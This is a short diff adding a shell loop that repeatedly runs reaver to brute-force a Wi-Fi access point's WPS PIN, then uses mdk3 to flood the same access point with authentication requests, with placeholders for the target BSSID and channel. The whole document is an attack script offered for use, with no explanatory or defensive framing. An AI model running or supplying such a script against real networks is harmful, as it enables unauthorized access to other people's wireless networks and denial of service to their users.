@@ -1,0 +1,9 @@
+while :; do echo
+echo "starting reaver...";
+echo y|reaver -i wlan0mon -b <bssid> -c <channel#> -g 5 -vv
+echo ...
+echo ...
+echo ...
+timeout 10s mdk3 wlan0mon a -a <bssid> -m
+sleep 60
+done
